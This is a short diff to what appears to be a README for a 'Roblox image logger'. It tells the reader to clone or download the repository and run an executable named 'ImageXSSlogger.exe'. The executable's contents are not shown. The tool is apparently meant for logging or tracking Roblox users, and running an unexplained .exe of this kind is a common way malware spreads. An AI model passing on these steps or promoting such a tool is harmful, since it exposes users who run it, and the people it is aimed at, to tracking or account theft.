@@ -1,3 +1,4 @@
+This is a Roblox image logger method
 Image Logger instructions 
 Step 1 clone the repository or download as zip
 Step 2 find "ImageXSSlogger.exe" and run it
